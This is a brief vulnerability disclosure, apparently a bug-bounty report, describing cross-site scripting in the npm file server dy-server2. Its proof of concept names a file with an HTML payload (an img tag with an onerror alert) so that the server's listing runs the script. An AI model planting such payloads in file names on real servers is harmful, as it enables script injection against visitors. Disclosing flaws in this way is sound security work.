# Description

`Cross Site Scripting` in `dy-server2`

# Proof of Concept

1. Install package from npm: npm i -g dy-server2
2. Create folder or file with name: `<img src=x onerror=alert(1)>`
3. Start server: dy-server2 -p 8888
4. Open website and the code will execute
